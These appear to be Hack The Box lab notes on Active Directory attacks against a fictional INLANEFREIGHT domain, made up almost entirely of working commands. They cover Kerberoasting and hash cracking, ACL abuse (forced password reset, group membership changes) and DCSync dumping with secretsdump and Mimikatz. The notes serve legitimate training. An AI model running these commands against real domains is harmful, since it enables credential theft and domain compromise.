 [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names)

Things you need for this to work is:
Clear text password or hash
Shell

# Ways to Perform the Attack
- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.

### Using Impacket (Linux)
`GetUserSPN.py`

```python
sudo python3 -m pip install .

# Listing the SPN Accounts. Starting without the user.
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

# Requesting all TGS tickets or single user or saving to a file
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
-outputfile sqldev_tgs

# Cracking the tickets
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5

# Authenticating to the Domain Controller
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```


### With Windows (Manually)
```powershell
# Similiar to Impacket
setspn.exe -Q */*

# Focusing on the target
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

# Retrieving all Tickets
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

#### Mimikatz
```bash
base64 /out:true
kerberos::list /export
```

#### Cracking
```bash
# Windows
echo "<base64 blob>" | tr -d \\n
# Kali (Placing the output into a file as .kirbi)
cat encoded_file | base64 -d > sqldev.kirbi

# Extracting the kerberos ticket then modding the file
python2.7 kirbi2john.py sqldev.kirbi
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

# Cracking it hash
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```



## Access Control List (ACL)
```powershell
# Finding information
Find-InterestingDomainAcl

# Using one's credentials
Import-Module .\PowerView.ps1
'$sid' = Convert-NameToSid wley
# Getting the DomainObjectACL
Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}

# The ObjectACEType can tell you all you can do
```

```Powershell
# Performing a reverse search and mapping to a guid value
PS C:\htb> $guid= "00299570-246d-11d0-a768-00aa006e0529" 
PS C:\htb> Get-ADObject -SearchBase "CN=Extended-Rights,$((Get-ADRootDSE).ConfigurationNamingContext)" -Filter {ObjectClass -like 'ControlAccessRight'} -Properties * |Select Name,DisplayName,DistinguishedName,rightsGuid| ?{$_.rightsGuid -eq $guid} | fl

# OR you can resolve them with powerview
Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}


# Getting users
PS C:\Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt

PS C:\htb> foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
```


# Exercise and Commands
```Powershell
PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD HERE>' -AsPlainText -Force 
PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)

PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force

PS C:\htb> cd C:\Tools\
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose

PS C:\htb> $SecPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
PS C:\htb> $Cred2 = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\damundsen', $SecPassword)

PS C:\htb> Get-ADGroup -Identity "Help Desk Level 1" -Properties * | Select -ExpandProperty Members

PS C:\htb> Add-DomainGroupMember -Identity 'Help Desk Level 1' -Members 'damundsen' -Credential $Cred2 -Verbose

PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName

PS C:\htb> .\Rubeus.exe kerberoast /user:adunn /nowrap

# Clean up of the environment
PS C:\htb> Set-DomainObject -Credential $Cred2 -Identity adunn -Clear serviceprincipalname -Verbose
PS C:\htb> Remove-DomainGroupMember -Identity "Help Desk Level 1" -Members 'damundsen' -Credential $Cred2 -Verbose
PS C:\htb> Get-DomainGroupMember -Identity "Help Desk Level 1" | Select MemberName |? {$_.MemberName -eq 'damundsen'} -Verbose
```

## Second Exercise with DCSync
```powershell
# Using Get-DomainUser to View adunn's Group Membership
PS C:\htb> Get-DomainUser -Identity adunn |select samaccountname,objectsid,memberof,useraccountcontrol |fl

# Using Get-ObjectAcl to check adunn's replication rights
PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

```zsh
Lazarus2858@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

```powershell
# Enumerating Further with Get-ADUser
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl

# Checking for Reversible Encryption Option using Get-DomainUser
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol

# Using runas and using mimikatz
runas /netonly /user:INLANEFREIGHT\adunn powershell

.\mimikatz.exe
privilege::debug
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

